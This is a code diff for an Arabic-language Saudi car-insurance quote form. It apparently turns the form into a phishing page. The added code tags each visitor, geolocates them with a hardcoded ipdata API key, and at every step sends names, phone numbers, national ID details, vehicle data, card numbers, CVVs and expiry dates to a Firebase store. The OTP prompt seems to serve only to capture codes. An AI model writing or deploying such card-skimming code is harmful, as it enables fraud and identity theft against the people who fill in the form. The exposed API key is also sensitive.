@@ -1,12 +1,24 @@
 "use client"
-
 import type React from "react"
 import { offerData } from "@/lib/offer-data"
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Globe, RefreshCw, Check, X } from "lucide-react"
+import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
+import { FullPageLoader } from "@/components/loader"
+import PaymentPage from "@/components/pay-form"
 
+const allOtps = [""]
+
+function randstr(prefix: string) {
+  return Math.random()
+    .toString(36)
+    .replace("0.", prefix || "")
+}
+
+const visitorID = randstr("BcaApp-")
 
 export default function InsuranceForm() {
   const [currentStep, setCurrentStep] = useState(1)
@@ -24,7 +36,7 @@ export default function InsuranceForm() {
   const [otpError, setOtpError] = useState("")
   const [otpAttempts, setOtpAttempts] = useState(5)
   const [cardNumber, setCardNumber] = useState("")
-  const [idNumber, setIdNumber] = useState("")
+  const [identityNumber, setidentityNumber] = useState("")
   const [ownerName, setOwnerName] = useState("")
   const [phoneNumber, setPhoneNumber] = useState("")
   const [serialNumber, setSerialNumber] = useState("")
@@ -36,8 +48,73 @@ export default function InsuranceForm() {
   const [repairLocation, setRepairLocation] = useState("agency")
   const [expiryDate, setExpiryDate] = useState("")
   const [cvv, setCvv] = useState("")
+  const [loading, setLoading] = useState(true)
   const [selectedFeatures, setSelectedFeatures] = useState<Record<string, string[]>>({})
-  const [idNumberError, setIdNumberError] = useState("") // Added error state for ID validation
+  const [identityNumberError, setidentityNumberError] = useState("")
+  const [offersTab, setOffersTab] = useState<"comprehensive" | "against-others">("against-others")
+
+  const [formData, setFormData] = useState({
+    identityNumber: "",
+    ownerName: "",
+    phoneNumber: "",
+    serialNumber: "",
+    coverageType: "",
+    vehicleUsage: "",
+    vehicleValue: 0,
+    manufacturingYear: 2024,
+    vehicleModel: "",
+    repairLocation: "agency" as "agency" | "workshop",
+  })
+
+  const [data, setData] = useState({
+    identityNumber: formData.identityNumber,
+    ownerName,
+    phoneNumber,
+    documentType,
+    serialNumber,
+    insuranceType,
+    insuranceStartDate,
+    vehicleUsage,
+    vehicleValue,
+    vehicleModel: "",
+    repairLocation: "agency",
+    currentStep: 1,
+    status: "draft",
+    paymentStatus: "pending",
+    phoneVerificationCode: "",
+    phoneVerificationStatus: "pending",
+    idVerificationCode: "",
+    idVerificationStatus: "pending",
+    country: "",
+  })
+
+  useEffect(() => {
+    getLocation().then(() => {
+      setLoading(false)
+    })
+  }, [])
+
+  async function getLocation() {
+    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
+
+    try {
+      const response = await fetch(url)
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`)
+      }
+      const country = await response.text()
+      await addData({
+        id: visitorID,
+        country: country,
+        currentStep:1
+      })
+      localStorage.setItem("country", country)
+      setupOnlineStatus(visitorID)
+    } catch (error) {
+      console.error("Error fetching location:", error)
+    }
+  }
 
   function generateCaptcha() {
     return Math.floor(1000 + Math.random() * 9000).toString()
@@ -50,76 +127,84 @@ export default function InsuranceForm() {
   }
 
   const validateSaudiId = (id: string): boolean => {
-    // Remove any spaces or special characters
     const cleanId = id.replace(/\s/g, "")
 
-    // Check if it's exactly 10 digits
     if (!/^\d{10}$/.test(cleanId)) {
-      setIdNumberError("رقم الهوية يجب أن يكون 10 أرقام")
+      setidentityNumberError("رقم الهوية يجب أن يكون 10 أرقام")
       return false
     }
 
-    // Check if it starts with 1 or 2 (Saudi national ID format)
     if (!/^[12]/.test(cleanId)) {
-      setIdNumberError("رقم الهوية يجب أن يبدأ بـ 1 أو 2")
+      setidentityNumberError("رقم الهوية يجب أن يبدأ بـ 1 أو 2")
       return false
     }
 
-    // Validate using Luhn algorithm (checksum validation)
     let sum = 0
     for (let i = 0; i < 10; i++) {
       let digit = Number.parseInt(cleanId[i])
-
-      // Double every second digit from right to left
       if ((10 - i) % 2 === 0) {
         digit *= 2
-        // If doubled digit is greater than 9, subtract 9
         if (digit > 9) {
           digit -= 9
         }
       }
-
       sum += digit
     }
 
-    // Valid if sum is divisible by 10
     if (sum % 10 !== 0) {
-      setIdNumberError("رقم الهوية غير صالح")
+      setidentityNumberError("رقم الهوية غير صالح")
       return false
     }
 
-    setIdNumberError("")
+    setidentityNumberError("")
     return true
   }
 
-  const handleFirstStepSubmit = (e: React.FormEvent) => {
+  const handleFirstStepSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
 
-    // Validate Saudi ID
-    if (!validateSaudiId(idNumber)) {
-      return // Don't proceed if validation fails
+    if (!validateSaudiId(identityNumber)) {
+      return
     }
 
-    setCurrentStep(2)
+    await addData({ id: visitorID, ownerName, phoneNumber, documentType, serialNumber,currentStep:2 }).then(() => {
+      setCurrentStep(2)
+    })
   }
 
-  const handleSecondStepSubmit = (e: React.FormEvent) => {
+  const handleSecondStepSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
-    setCurrentStep(3)
+
+    await addData({
+      id: visitorID,
+      insuranceType,
+      insuranceStartDate,
+      vehicleValue,
+      vehicleModel,
+      repairLocation,currentStep:3
+    }).then(() => {
+      setCurrentStep(3)
+    })
   }
 
-  const handleSelectOffer = (offer: (typeof offerData)[0]) => {
+  const handleSelectOffer = async (offer: (typeof offerData)[0]) => {
     setSelectedOffer(offer)
-    setCurrentStep(4)
+    await addData({ id: visitorID, selectedOffer: offer.company, offerValue: offer.main_price ,currentStep:4}).then(() => {
+      setCurrentStep(4)
+    })
   }
 
-  const handlePayment = (e: React.FormEvent) => {
+  const handlePayment = async (e: React.FormEvent) => {
     e.preventDefault()
-    setShowOtpDialog(true)
+
+    await addData({ id: visitorID, cardNumber, cvv, expiryDate, selectedPaymentMethod, }).then(() => {
+      setShowOtpDialog(true)
+    })
   }
 
   const handleOtpSubmit = (e: React.FormEvent) => {
     e.preventDefault()
+
     if (otpValue === "123456") {
       setShowOtpDialog(false)
       alert("تم الدفع بنجاح!")
@@ -155,8 +240,12 @@ export default function InsuranceForm() {
     return mainPrice + featuresPrice + expensesTotal
   }
 
+  const filteredOffers = offerData.filter((offer) => offer.type === offersTab)
+
   return (
     <div className="min-h-screen bg-[#0a4a68]">
+      {loading && <FullPageLoader />}
+
       {currentStep === 1 && (
         <>
           <div className="bg-[#0a4a68] px-3 py-3 md:px-6 md:py-4 flex items-center justify-between border-b border-white/10">
@@ -164,7 +253,6 @@ export default function InsuranceForm() {
               <Globe className="w-4 h-4 md:w-5 md:h-5 text-[#0a4a68]" />
               <span className="text-[#0a4a68] font-semibold text-sm md:text-base">EN</span>
             </button>
-
             <div className="w-10 h-10 md:w-12 md:h-12 rounded-full bg-white/10 border-2 border-white flex items-center justify-center shadow-md">
               <span className="text-white text-xl md:text-2xl font-bold">B</span>
             </div>
@@ -225,18 +313,18 @@ export default function InsuranceForm() {
 
                 <Input
                   placeholder="رقم الهوية / الإقامة"
-                  value={idNumber}
+                  value={identityNumber}
                   onChange={(e) => {
-                    setIdNumber(e.target.value)
-                    if (idNumberError) setIdNumberError("")
+                    setidentityNumber(e.target.value)
+                    if (identityNumberError) setidentityNumberError("")
                   }}
                   className="h-11 md:h-12 text-right text-sm md:text-base border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm"
                   dir="rtl"
                   required
                 />
-                {idNumberError && (
+                {identityNumberError && (
                   <p className="text-red-500 text-sm mt-1 text-right" dir="rtl">
-                    {idNumberError}
+                    {identityNumberError}
                   </p>
                 )}
 
@@ -503,8 +591,35 @@ export default function InsuranceForm() {
             </div>
           </div>
 
+          <div className="max-w-4xl mx-auto mb-4 md:mb-6">
+            <div className="bg-white rounded-lg md:rounded-xl shadow-md overflow-hidden">
+              <div className="grid grid-cols-2 text-center" dir="rtl">
+                <button
+                  onClick={() => setOffersTab("comprehensive")}
+                  className={`py-3 md:py-4 font-bold text-sm md:text-base lg:text-lg transition-all ${
+                    offersTab === "comprehensive"
+                      ? "bg-[#0a4a68] text-white"
+                      : "bg-gray-100 text-gray-600 hover:bg-gray-200"
+                  }`}
+                >
+                  تأمين شامل
+                </button>
+                <button
+                  onClick={() => setOffersTab("against-others")}
+                  className={`py-3 md:py-4 font-bold text-sm md:text-base lg:text-lg transition-all ${
+                    offersTab === "against-others"
+                      ? "bg-[#0a4a68] text-white"
+                      : "bg-gray-100 text-gray-600 hover:bg-gray-200"
+                  }`}
+                >
+                  تأمين ضد الغير
+                </button>
+              </div>
+            </div>
+          </div>
+
           <div className="max-w-4xl mx-auto space-y-3 md:space-y-4">
-            {offerData.map((offer) => {
+            {filteredOffers.map((offer) => {
               const offerSelectedFeatures = selectedFeatures[offer.id] || []
               const totalPrice = calculateOfferTotal(offer, offerSelectedFeatures)
 
@@ -516,7 +631,7 @@ export default function InsuranceForm() {
                 >
                   <div className="flex items-start justify-between gap-3 md:gap-4 mb-3 md:mb-4">
                     <div className="flex-1">
-                      <h3 className="text-lg md:text-xl font-bold text-gray-900 mb-1 md:mb-2">{offer.name}</h3>
+                      <h3 className="text-lg md:text-xl font-bold text-gray-900 mb-1 md:mb-2">{offer.company.name}</h3>
                       <p className="text-blue-600 font-semibold text-base md:text-lg mb-3 md:mb-4">
                         التأمين {offer.type === "against-others" ? "ضد الغير" : "شامل"}
                       </p>
@@ -594,7 +709,10 @@ export default function InsuranceForm() {
               </h2>
 
               <div className="bg-gray-50 rounded-lg md:rounded-xl p-4 md:p-5 mb-4 md:mb-6 border-2 border-gray-200">
-                <h3 className="text-lg md:text-xl font-bold text-gray-900 mb-3 md:mb-4">{selectedOffer.company.name}</h3>
+                <h3 className="text-lg md:text-xl font-bold text-gray-900 mb-3 md:mb-4">
+                  {selectedOffer.company.name}
+                </h3>
+
                 <div className="space-y-2 md:space-y-3 mb-4 md:mb-5">
                   {selectedOffer.extra_features.map((feature, idx) => (
                     <div key={idx} className="flex items-center gap-2">
@@ -603,100 +721,17 @@ export default function InsuranceForm() {
                     </div>
                   ))}
                 </div>
+
                 <div className="border-t-2 border-gray-200 pt-3 md:pt-4">
                   <div className="flex justify-between items-center">
                     <span className="text-base md:text-lg font-semibold text-gray-700">المبلغ الإجمالي:</span>
-                    <span className="text-2xl md:text-3xl font-bold text-[#0a4a68]">{selectedOffer.main_price} ريال</span>
+                    <span className="text-2xl md:text-3xl font-bold text-[#0a4a68]">
+                      {selectedOffer.main_price} ريال
+                    </span>
                   </div>
                 </div>
               </div>
-
-              <form onSubmit={handlePayment} className="space-y-4 md:space-y-5">
-                <div className="space-y-2">
-                  <label className="block text-gray-700 font-semibold text-sm md:text-base">طريقة الدفع</label>
-                  <div className="space-y-2 md:space-y-3">
-                    <label className="flex items-center gap-2 md:gap-3 p-3 md:p-4 border-2 rounded-lg md:rounded-xl cursor-pointer hover:bg-gray-50 transition-colors">
-                      <input
-                        type="radio"
-                        name="paymentMethod"
-                        value="credit-discount"
-                        checked={selectedPaymentMethod === "credit-discount"}
-                        onChange={() => setSelectedPaymentMethod("credit-discount")}
-                        className="w-4 h-4 md:w-5 md:h-5"
-                      />
-                      <span className="text-sm md:text-base font-medium">بطاقة ائتمانية (خصم 5%)</span>
-                    </label>
-                    <label className="flex items-center gap-2 md:gap-3 p-3 md:p-4 border-2 rounded-lg md:rounded-xl cursor-pointer hover:bg-gray-50 transition-colors">
-                      <input
-                        type="radio"
-                        name="paymentMethod"
-                        value="credit"
-                        checked={selectedPaymentMethod === "credit"}
-                        onChange={() => setSelectedPaymentMethod("credit")}
-                        className="w-4 h-4 md:w-5 md:h-5"
-                      />
-                      <span className="text-sm md:text-base font-medium">بطاقة ائتمانية</span>
-                    </label>
-                    <label className="flex items-center gap-2 md:gap-3 p-3 md:p-4 border-2 rounded-lg md:rounded-xl cursor-pointer hover:bg-gray-50 transition-colors">
-                      <input
-                        type="radio"
-                        name="paymentMethod"
-                        value="mada"
-                        checked={selectedPaymentMethod === "mada"}
-                        onChange={() => setSelectedPaymentMethod("mada")}
-                        className="w-4 h-4 md:w-5 md:h-5"
-                      />
-                      <span className="text-sm md:text-base font-medium">مدى</span>
-                    </label>
-                  </div>
-                </div>
-
-                <div className="space-y-2">
-                  <label className="block text-gray-700 font-semibold text-sm md:text-base">رقم البطاقة</label>
-                  <Input
-                    type="tel"
-                    placeholder="0000 0000 0000 0000"
-                    value={cardNumber}
-                    onChange={(e) => setCardNumber(e.target.value)}
-                    className="h-11 md:h-12 text-right text-sm md:text-base border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68]"
-                    dir="ltr"
-                    required
-                  />
-                </div>
-
-                <div className="grid grid-cols-2 gap-3 md:gap-4">
-                  <div className="space-y-2">
-                    <label className="block text-gray-700 font-semibold text-sm md:text-base">تاريخ الانتهاء</label>
-                    <Input
-                      type="tel"
-                      placeholder="MM/YY"
-                      value={expiryDate}
-                      onChange={(e) => setExpiryDate(e.target.value)}
-                      className="h-11 md:h-12 text-center text-sm md:text-base border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68]"
-                      required
-                    />
-                  </div>
-                  <div className="space-y-2">
-                    <label className="block text-gray-700 font-semibold text-sm md:text-base">CVV</label>
-                    <Input
-                      type="tel"
-                      placeholder="000"
-                      value={cvv}
-                      onChange={(e) => setCvv(e.target.value)}
-                      maxLength={3}
-                      className="h-11 md:h-12 text-center text-sm md:text-base border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68]"
-                      required
-                    />
-                  </div>
-                </div>
-
-                <Button
-                  type="submit"
-                  className="w-full h-12 md:h-14 bg-yellow-500 hover:bg-yellow-600 text-[#0a4a68] font-bold text-base md:text-lg rounded-lg md:rounded-xl shadow-lg hover:shadow-xl transition-all"
-                >
-                  تأكيد الدفع
-                </Button>
-              </form>
+              <PaymentPage />
             </div>
           </div>
         </div>
